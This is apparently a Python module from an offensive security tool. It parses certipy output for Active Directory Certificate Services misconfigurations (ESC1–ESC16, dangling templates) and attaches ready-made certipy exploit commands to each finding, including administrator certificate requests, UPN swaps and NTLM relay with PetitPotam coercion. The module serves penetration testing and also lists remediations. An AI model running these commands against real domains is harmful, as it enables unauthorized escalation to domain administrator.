"""ADCS certificate-template vulnerability parsing (certipy).

Modern AD boxes are won through ADCS: `certipy find -vulnerable -stdout` lists the
ESC1-ESC16 misconfigurations on each certificate template. breachload does not
run certipy in-loop (it needs domain credentials), but once the operator collects
that output this parser folds it into ESC findings, each carrying the concrete
`certipy req` exploit command for a domain-admin certificate.

Deterministic text parsing, fully offline. Complements the ADCS attack chains in
`chains.json` (ESC1/ESC8/ESC9/shadow-cred).
"""

from __future__ import annotations

import re

from ..core.state import Finding, Severity

# certipy find prints template blocks; each carries a Template Name and, when
# vulnerable, an "ESC<N> : ..." line under a [!] Vulnerabilities section.
_TEMPLATE_RE = re.compile(r"Template Name\s*:\s*(.+)")
_CA_RE = re.compile(r"CA Name\s*:\s*(.+)")
_ESC_RE = re.compile(r"\b(ESC\d{1,2})\b\s*:?\s*(.*)")

# One-line technique pointer per ESC id (the ones certipy flags most often).
_ESC_NOTE = {
    "ESC1": "Enrollee supplies subject (SAN) -> request a cert as any user, incl. a DA.",
    "ESC2": "Any-purpose EKU -> use the cert for client auth as a privileged user.",
    "ESC3": "Enrollment-agent template -> request on behalf of a privileged user.",
    "ESC4": "Vulnerable template ACL -> rewrite the template to be ESC1, then exploit.",
    "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA -> SAN injection like ESC1.",
    "ESC7": "Vulnerable CA ACL (ManageCA/ManageCertificates) -> approve your own request.",
    "ESC8": "Web enrollment + NTLM relay -> relay a machine account to get a cert.",
    "ESC9": "No security extension -> UPN swap on a controlled account for a DA cert.",
    "ESC10": "Weak cert mapping -> UPN swap / Schannel mapping abuse.",
    "ESC11": "IF_ENFORCEENCRYPTICERTREQUEST off -> RPC relay to the CA.",
    "ESC13": "Issuance policy linked to a group -> cert grants that group's rights.",
    "ESC16": "Security extension disabled CA-wide -> UPN swap like ESC9.",
}


def _exploit_for(esc: str, template: str, ca: str) -> str:
    tmpl = template or "<template>"
    ca = ca or "<CA>"
    if esc in ("ESC1", "ESC2", "ESC3", "ESC4", "ESC6"):
        return (f"certipy req -u <user>@<domain> -p '<pass>' -dc-ip <DC> -ca {ca} "
                f"-template {tmpl} -upn administrator@<domain>   "
                "# then: certipy auth -pfx administrator.pfx")
    if esc in ("ESC9", "ESC16"):
        return (f"certipy account update -u <user>@<domain> -p '<pass>' -user <victim> "
                f"-upn administrator@<domain>; certipy req -u <victim>@<domain> -p '<vpass>' "
                f"-ca {ca} -template {tmpl}; certipy auth -pfx administrator.pfx")
    if esc == "ESC8":
        return (f"certipy relay -target http://{ca} -template {tmpl}   "
                "# relay a machine acct (coerce with petitpotam)")
    if esc == "ESC7":
        return (f"certipy ca -u <user>@<domain> -p '<pass>' -ca {ca} -add-officer <user>   "
                "# then approve your own request")
    return f"certipy req -u <user>@<domain> -p '<pass>' -ca {ca} -template {tmpl}   # {esc}"


_ENABLED_RE = re.compile(r"Enabled Certificate Templates?\s*:?\s*(.*)", re.IGNORECASE)
# A section header that ends the enabled-templates block.
_SECTION_RE = re.compile(r"^\s*(Certificate Templates|Certificate Authorities|CA Name|"
                         r"Permissions|\[)")


def _enabled_templates(text: str) -> set[str]:
    """Template names the CA publishes (from 'Enabled Certificate Templates')."""
    lines = text.splitlines()
    names: set[str] = set()
    i = 0
    while i < len(lines):
        m = _ENABLED_RE.search(lines[i])
        if not m:
            i += 1
            continue
        # Collect the remainder of the marker line plus following indented entries
        # until the next section header.
        chunk = [m.group(1)]
        j = i + 1
        while j < len(lines) and lines[j].strip() and not _SECTION_RE.match(lines[j]) \
                and not _TEMPLATE_RE.search(lines[j]):
            chunk.append(lines[j])
            j += 1
        blob = " ".join(chunk)
        for tok in re.findall(r"'([^']+)'|\"([^\"]+)\"|([A-Za-z0-9_.-]+)", blob):
            name = next((t for t in tok if t), "")
            if name and name not in ("[", "]"):
                names.add(name)
        i = j
    return names


def parse_dangling_templates(text: str) -> list[Finding]:
    """Templates the CA publishes but that have no template *object* defined.

    A dangling reference: the CA still offers the template, yet the AD object is
    gone. If you can recreate/control that object (or a like-named one), you set
    its enrollment + subject flags yourself -> a bespoke ESC1. (DanglingTree.)
    """
    enabled = _enabled_templates(text)
    defined = {m.strip() for m in _TEMPLATE_RE.findall(text)}
    defined_lower = {d.lower() for d in defined}
    out: list[Finding] = []
    for name in sorted(enabled):
        if name.lower() not in defined_lower:
            out.append(Finding(
                title=f"Dangling ADCS template reference: {name}",
                severity=Severity.HIGH,
                description=f"The CA publishes template '{name}' but no matching template "
                            "object exists. If the object can be (re)created or is "
                            "attacker-controllable, define it as an ESC1 template "
                            "(enrollee-supplies-subject + client-auth EKU) and request a "
                            "DA certificate.",
                evidence=f"enabled but undefined: {name}",
                remediation="Unpublish the orphaned template from the CA, or restore a "
                            "correctly-secured template object.",
            ))
    return out


def parse_certipy(text: str) -> list[Finding]:
    """ESC findings from `certipy find` output, one per (template, ESC id)."""
    ca_name = ""
    m = _CA_RE.search(text)
    if m:
        ca_name = m.group(1).strip()

    out: list[Finding] = []
    seen: set[tuple[str, str]] = set()
    current_template = ""
    in_vulns = False
    for line in text.splitlines():
        tm = _TEMPLATE_RE.search(line)
        if tm:
            current_template = tm.group(1).strip()
            in_vulns = False
            continue
        if "Vulnerabilities" in line:
            in_vulns = True
            continue
        # ESC lines only count inside a template's [!] Vulnerabilities section, so
        # an "ESC1" mentioned in prose elsewhere is not misread as a finding.
        em = _ESC_RE.search(line)
        if em and in_vulns:
            esc = em.group(1).upper()
            key = (current_template or "?", esc)
            if key in seen:
                continue
            seen.add(key)
            note = _ESC_NOTE.get(esc, "ADCS certificate-template misconfiguration.")
            out.append(Finding(
                title=f"ADCS {esc} on template {current_template or '?'}",
                severity=Severity.CRITICAL,
                description=f"{esc}: {note} Template '{current_template or '?'}' on CA "
                            f"'{ca_name or '?'}'. A domain user can obtain a certificate "
                            "that authenticates as Domain Admin.",
                evidence=em.group(2).strip()[:300],
                exploit=_exploit_for(esc, current_template, ca_name),
                remediation="Remove the misconfiguration (enrollee-supplies-subject, "
                            "dangerous EKU, weak ACL, or SAN mapping) from the template/CA.",
            ))
    return out
